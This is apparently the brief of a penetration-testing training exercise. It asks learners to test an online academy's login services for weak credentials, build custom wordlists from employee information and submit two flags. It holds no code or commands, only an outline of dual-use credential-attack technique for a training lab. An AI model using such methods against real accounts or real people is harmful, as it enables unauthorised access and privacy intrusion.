We are given the IP address of an online academy but have no further information about their website. As the first step of conducting a Penetration Testing engagement, we have to determine whether any weak credentials are used across the website and other login services.

Look beyond just default/common passwords. Use the skills learned in this module to gather information about employees we identified to create custom wordlists to attack their accounts.

Attack the web application and submit two flags using the skills we covered in the module sections and submit them to complete this module.


